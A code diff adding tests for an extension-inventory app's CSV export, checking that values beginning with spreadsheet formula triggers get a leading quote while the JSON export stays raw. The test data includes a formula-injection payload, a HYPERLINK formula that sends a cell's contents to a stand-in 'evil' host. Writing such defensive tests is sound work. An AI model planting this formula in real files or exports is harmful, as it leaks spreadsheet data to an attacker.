@@ -122,3 +122,52 @@ async def test_dashboard_export_links_carry_filters(client, test_db, admin_user)
     assert r.status_code == 200
     assert "/api/extensions/export?format=csv&amp;store=edge" in r.text
     assert "/api/extensions/export?format=json&amp;store=edge" in r.text
+
+
+async def test_export_csv_escapes_formula_injection(client, test_db, admin_user):
+    """#147: attacker-controlled name/publisher that begin with a spreadsheet
+    formula trigger are prefixed with a single quote in the CSV so Excel/LibreOffice
+    treat them as text, not live formulas."""
+    async with AsyncSession(test_db) as s:
+        await _seed(
+            s,
+            admin_user,
+            [
+                ("a" * 32, "chrome", "+SUM(1+1)", 80, '=HYPERLINK("http://evil/?"&A1,"x")', "[]"),
+                ("b" * 32, "edge", "@cmd", 10, "-2+3", "[]"),
+            ],
+        )
+
+    r = await client.get("/api/extensions/export")
+    assert r.status_code == 200
+    reader = list(csv.DictReader(io.StringIO(r.text)))
+    by_id = {row["extension_id"]: row for row in reader}
+
+    hostile = by_id["a" * 32]
+    assert hostile["name"] == '\'=HYPERLINK("http://evil/?"&A1,"x")'  # leading quote added
+    assert hostile["publisher"] == "'+SUM(1+1)"
+
+    other = by_id["b" * 32]
+    assert other["name"] == "'-2+3"
+    assert other["publisher"] == "'@cmd"
+
+
+async def test_export_csv_leaves_benign_values_unquoted(client, test_db, admin_user):
+    async with AsyncSession(test_db) as s:
+        await _seed(s, admin_user, [("a" * 32, "chrome", "Acme Corp", 80, "Alpha", '["tabs"]')])
+    r = await client.get("/api/extensions/export")
+    row = next(csv.DictReader(io.StringIO(r.text)))
+    assert row["name"] == "Alpha"  # unchanged
+    assert row["publisher"] == "Acme Corp"
+    assert row["permissions"] == "tabs"
+
+
+async def test_export_json_is_not_escaped(client, test_db, admin_user):
+    """The JSON export is not opened as a spreadsheet, so it stays the raw value —
+    escaping there would corrupt the data (#147)."""
+    async with AsyncSession(test_db) as s:
+        await _seed(s, admin_user, [("a" * 32, "chrome", "+SUM(1)", 80, "=1+1", "[]")])
+    r = await client.get("/api/extensions/export?format=json")
+    (row,) = r.json()
+    assert row["name"] == "=1+1"  # raw, no leading quote
+    assert row["publisher"] == "+SUM(1)"
